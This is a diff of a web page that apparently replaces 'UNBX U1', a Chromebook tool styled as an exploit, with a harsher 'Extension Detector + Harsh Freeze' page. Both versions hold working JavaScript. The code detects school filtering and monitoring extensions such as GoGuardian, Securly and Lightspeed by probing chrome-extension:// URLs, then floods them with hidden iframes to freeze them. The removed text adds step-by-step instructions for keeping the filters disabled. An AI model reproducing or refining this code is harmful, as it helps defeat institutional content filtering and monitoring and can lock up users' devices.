@@ -1,332 +1,121 @@
 <!DOCTYPE html>
-<html lang="en">
-  <head>
-    <title>UNBX</title>
-    <meta charset="utf-8" />
-    <meta name="viewport" content="width=device-width" />
-    <style>
-      * {
-        font-family: Sans-serif;
-        color: white; /* White text for contrast */
-      }
-      a {
-        color: #6daebd;
-      }
-      a:hover {
-        color: #4f9eb0;
-      }
-      pre,
-      code {
-        font-family: monospace;
-        background-color: #1e2324;
-        padding: 4px;
-        overflow-x: auto;
-      }
-      pre {
-        padding: 8px;
-      }
-      pre code {
-        background-color: transparent;
-        border: none;
-        padding: 0px;
-      }
-      body {
-        background-color: #f4f4f4; /* Light gray outer background */
-        width: 100%;
-        height: 100%;
-        margin: 0px;
-      }
-      button {
-        background-color: #33626c;
-        color: white;
-        padding: 6px 8px;
-        border: none;
-        font-size: 15px;
-        cursor: pointer;
-      }
-      button:hover {
-        background-color: #2a5259;
-      }
-      #main_div {
-        max-width: 800px;
-        background-color: #252b2d; /* Dark gray center background */
-        padding: 16px;
-        margin: 16px auto;
-        border-radius: 8px;
-        box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
-      }
-      #buttons_container {
-        display: flex;
-        flex-wrap: wrap;
-        gap: 8px;
-      }
-    </style>
+<html>
+<head>
+  <title>Extension Detector + Harsh Freeze</title>
+  <style>
+    body { font-family: sans-serif; background: #111; color: white; padding: 2rem; }
+    button { margin-top: 10px; padding: 10px; background: red; color: white; border: none; cursor: pointer; }
+    ul { list-style: none; padding: 0; }
+  </style>
+</head>
+<body>
+  <h2>🎯 Extension Detection</h2>
+  <p>Detected Extensions:</p>
+  <ul id="result"></ul>
 
-    <script>
-      let from_id = (id) => document.getElementById(id);
+  <button onclick="triggerFreeze()">🔥 Harsh Freeze Lightspeed</button>
 
-      // Keep your extension info with IDs and names
-      let extensions = {
-        securly_new: {
-          name: "Securly",
-          id: "joflmkccibkooplaeoinecjbmdebglab",
-        },
-        securly_old: {
-          name: "Securly (old)",
-          id: "iheobagjkfklnlikgihanlhcddjoihkg",
-        },
-        goguardian: {
-          name: "Goguardian",
-          id: "haldlgldplgnggkjaafhelgiaglafanh",
-        },
-        lanschool: {
-          name: "LANSchool",
-          id: "baleiojnjpgeojohhhfbichcodgljmnj",
-        },
-        linewize: {
-          name: "Linewize",
-          id: "ddfbkhpmcdbciejenfcolaaiebnjcbfc",
-        },
-        blocksi: {
-          name: "Blocksi",
-          id: "ghlpmldmjjhmdgmneoaibbegkjjbonbk",
-        },
-        fortiguard: {
-          name: "Fortiguard",
-          id: "igbgpehnbmhgdgjbhkkpedommgmfbeao",
-        },
-        cisco: {
-          name: "Cisco Umbrella",
-          id: "jcdhmojfecjfmbdpchihbeilohgnbdci",
-        },
-        contentkeeper: {
-          name: "ContentKeeper",
-          id: "jdogphakondfdmcanpapfahkdomaicfa",
-        },
-        contentkeeperg3: {
-          name: "CK-Authenticator G3",
-          id: "odoanpnonilogofggaohhkdkdgbhdljp",
-        },
-        securlyclassroom: {
-          name: "Securly Classroom",
-          id: "jfbecfmiegcjddenjhlbhlikcbfmnafd",
-        },
-        hapara: {
-          name: "Hapara",
-          id: "kbohafcopfpigkjdimdcdgenlhkmhbnc",
-        },
-        "hapara-new-id": {
-          name: "Hapara",
-          id: "aceopacgaepdcelohobicpffbbejnfac",
-        },
-        iboss: {
-          name: "iboss",
-          id: "kmffehbidlalibfeklaefnckpidbodff",
-        },
-        lightspeedfilteragent: {
-          name: "Lightspeed Filter Agent",
-          id: "ehnniokiiebpinnfegpkdlcamgdcaaje",
-        },
-        lightspeedclassroom: {
-          name: "Lightspeed Classroom",
-          id: "kkbmdgjggcdajckdlbngdjonpchpaiea",
-        },
-        interclass: {
-          name: "InterCLASS Filtering Service",
-          id: "jbddgjglgkkneonnineaohdhabjbgopi",
-        },
-        intersafe: {
-          name: "InterSafe GatewayConnection Agent",
-          id: "ecjoghccnjlodjlmkgmnbnkdcbnjgden",
-        },
-        loilo: {
-          name: "ロイロWebフィルター/LoiLo Web Filters",
-          id: "pabjlbjcgldndnpjnokjakbdofjgnfia",
-        },
-        gopher_buddy: {
-          name: "Gopher Buddy",
-          id: "cgbbbjmgdpnifijconhamggjehlamcif",
-        },
-        lanschool_helper: {
-          name: "LanSchool Web Helper",
-          id: "honjcnefekfnompampcpmcdadibmjhlk",
-        },
-        imtlazarus: {
-          name: "IMTLazarus",
-          id: "cgigopjakkeclhggchgnhmpmhghcbnaf",
-        },
-        impero_backdrop: {
-          name: "Impero Backdrop",
-          id: "jjpmjccpemllnmgiaojaocgnakpmfgjg",
-        },
-        mobile_guardian: {
-          name: "Mobile Guardian",
-          id: "fgmafhdohjkdhfaacgbgclmfgkgokgmb",
-        },
-      };
-
-      // Detect extension by trying to load icon-128.png in hidden iframe
-      function checkExtensionIframe(id) {
-        return new Promise((resolve) => {
-          let iframe = document.createElement("iframe");
-          iframe.style.width = "1px";
-          iframe.style.height = "1px";
-          iframe.style.position = "absolute";
-          iframe.style.left = "-9999px";
-          iframe.src = `chrome-extension://${id}/icon-128.png?cachebust=${Date.now()}`;
-          document.body.appendChild(iframe);
-
-          iframe.onload = () => {
-            document.body.removeChild(iframe);
-            resolve(true);
-          };
-          iframe.onerror = () => {
-            document.body.removeChild(iframe);
-            resolve(false);
-          };
-
-          setTimeout(() => {
-            if (document.body.contains(iframe)) {
-              document.body.removeChild(iframe);
-              resolve(false);
-            }
-          }, 1500);
-        });
+  <script>
+    const knownExtensions = [
+      {
+        key: "lightspeedfilteragent",
+        name: "Lightspeed Filter Agent",
+        id: "ehnniokiiebpinnfegpkdlcamgdcaaje",
+        testPath: "icon-128.png"
+      },
+      {
+        key: "blocksi",
+        name: "Blocksi Web Filter",
+        id: "ghlpmldmjjhmdgmneoaibbegkjjbonbk",
+        testPath: "icon-128.png"
+      },
+      {
+        key: "goguardian",
+        name: "GoGuardian",
+        id: "haldlgldplgnggkjaafhelgiaglafanh",
+        testPath: "icon-128.png"
+      },
+      {
+        key: "securly",
+        name: "Securly SmartPac",
+        id: "joflmkccibkooplaeoinecjbmdebglab",
+        testPath: "icon-128.png"
       }
+    ];
 
-      async function checkExtension(id) {
-        return await checkExtensionIframe(id);
-      }
+    const resultBox = document.getElementById('result');
+    const detected = [];
 
-      async function detect_extensions() {
-        let detected = [];
-        for (let ext of Object.values(extensions)) {
-          if (await checkExtension(ext.id)) {
-            detected.push(ext);
-          }
+    async function checkExtension(id, path) {
+      return new Promise((resolve) => {
+        const img = new Image();
+        img.src = `chrome-extension://${id}/${path}?${Math.random()}`;
+        img.onload = () => resolve(true);
+        img.onerror = () => resolve(false);
+      });
+    }
+
+    async function detectExtensions() {
+      for (const ext of knownExtensions) {
+        const found = await checkExtension(ext.id, ext.testPath);
+        if (found) {
+          detected.push(ext);
+          const li = document.createElement('li');
+          li.textContent = `✅ ${ext.name}`;
+          resultBox.appendChild(li);
         }
-        return detected;
       }
 
-      async function main() {
-        let buttons_container = from_id("buttons_container");
+      if (detected.length === 0) {
+        const li = document.createElement('li');
+        li.textContent = "❌ No supported extensions detected.";
+        resultBox.appendChild(li);
+      }
+    }
 
-        if (!window.chrome) {
-          buttons_container.innerHTML = `<p><b>Error: You are not running a Chromium-based browser.</b></p>`;
+    function triggerFreeze() {
+      if (detected.length === 0) {
+        alert("No extensions found to freeze.");
+        return;
+      }
+
+      for (const ext of detected) {
+        harshFreeze(ext.id);
+      }
+    }
+
+    function harshFreeze(extensionId) {
+      let count = 0;
+      const max = 500;
+      const delay = 1;
+      const targets = ["background.js", "popup.html", "manifest.json", "icon-128.png"];
+
+      const interval = setInterval(() => {
+        if (count >= max) {
+          clearInterval(interval);
           return;
         }
 
-        buttons_container.innerHTML = `<p><i>Detecting extensions...</i></p>`;
+        const iframe = document.createElement('iframe');
+        iframe.style.width = '1px';
+        iframe.style.height = '1px';
+        iframe.style.position = 'absolute';
+        iframe.style.left = '-9999px';
 
-        let detected = await detect_extensions();
+        const file = targets[Math.floor(Math.random() * targets.length)];
+        iframe.src = `chrome-extension://${extensionId}/${file}?r=${Math.random()}`;
 
-        if (detected.length === 0) {
-          buttons_container.innerHTML = `<p><b>Error: No supported extensions detected.</b></p>`;
-          buttons_container.innerHTML += `<p style="margin-top: -16px;">If you want support for a specific extension added, please make an issue on the <a href="https://github.com/ading2210/dextensify">Github repository</a>, and provide the extension ID and manifest.</p>`;
-          return;
-        }
-
-        buttons_container.innerHTML = "";
-
-        for (let ext of detected) {
-          let button = document.createElement("button");
-          button.innerText = `Freeze ${ext.name}`;
-          button.onclick = () => {
-            button_handler(ext);
-          };
-          buttons_container.append(button);
-        }
-      }
-
-      function button_handler(extension) {
-        let cancel = !confirm(
-          "After hitting OK, there will be a 5 second delay until the extension starts being frozen. Switch to another tab immediately to prevent the entire device from locking up! The Chromebook might freeze permanently if this happens — HIT the refresh+Power."
-        );
-        if (cancel) return;
+        document.body.appendChild(iframe);
 
         setTimeout(() => {
-          create_iframes(extension);
-        }, 5000);
-      }
+          if (iframe.parentElement) iframe.remove();
+        }, 1500);
 
-      function create_iframes(extension) {
-        let count = 0;
-        const max_iframes = 20; // safer number of iframes
-        const id = extension.id;
+        count++;
+      }, delay);
+    }
 
-        let interval = setInterval(() => {
-          if (count >= max_iframes) {
-            clearInterval(interval);
-            return;
-          }
-
-          let iframe = document.createElement("iframe");
-          iframe.src = `chrome-extension://${id}/icon-128.png?cachebust=${Date.now()}_${count}`;
-          iframe.style.width = "1px";
-          iframe.style.height = "1px";
-          iframe.style.border = "none";
-          iframe.style.position = "absolute";
-          iframe.style.left = "-9999px"; // hide offscreen
-          iframe.setAttribute("sandbox", "allow-scripts allow-same-origin");
-          document.body.appendChild(iframe);
-
-          count++;
-        }, 300); // 300ms delay to reduce strain
-      }
-
-      window.onload = main;
-    </script>
-  </head>
-  <body>
-    <div id="main_div">
-      <h1 style="margin-top: 8px">(っ◔◡◔)っ ♥ UNBX U1 ♥</h1>
-      <p>UNBX U1 is an exploit which lets you disable Lightspeed Chrome extensions from any webpage.</p>
-      <h2>Instructions</h2>
-      <ol>
-        <li>Open chrome://extensions in a new tab. Keep this page open.</li>
-        <li>Go to the settings page for the extension you want to disable.</li>
-        <li>On the UNBX U1 page, click the "freeze extension" button. Immediately switch back to the chrome://extensions tab.</li>
-        <li>Back on the chrome://extensions page, spam the "allow access to file URLs" switch for a few seconds.</li>
-        <li>The extension should now be temporarily disabled. For this effect to persist, flip the "allow access to file URLs" again every few minutes, or if pages start getting blocked again.</li>
-        <li>You may also need to reopen this page every once in a while to prevent an unavoidable memory leak from crashing the system.</li>
-      </ol>
-      <p>
-        During this process, your Chromebook may hang momentarily. This is normal, and it should resolve itself after a few seconds.
-        Chromebook may heat up! you are WARNED! If caught am not responsible for any actions that were done! (this Freezer is for educational Learning only
-      </p>
-      <div id="buttons_container">
-        <p><i>Detecting extensions...</i></p>
-      </div>
-      <br />
-      <hr />
-      <details>
-        <summary style="margin-bottom: 8px;">
-          Made by <a href="https://www.youtube.com/@llyinx" target="_blank">MR_llyinx</a>. This file is licensed under the MIT license.
-        </summary>
-        <pre>
-MIT License
-Copyright (c) 2025 llyinx
-
-Permission is hereby granted, free of charge, to any person obtaining a copy
-of this software and associated documentation files (the "Software"), to deal
-in the Software without restriction, including with limitation the rights
-to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
-copies of the Software, and to permit persons to whom the Software is
-furnished to do so, subject to the following conditions:
-
-The above copyright notice and this permission notice shall be included in all
-copies or substantial portions of the Software.
-
-THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
-IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
-FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
-AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
-LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
-OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
-SOFTWARE.
-        </pre>
-        <p style="font-size: 13px; text-align: right;"><i>Version 1.1.2</i></p>
-      </details>
-    </div>
-  </body>
+    detectExtensions();
+  </script>
+</body>
 </html>
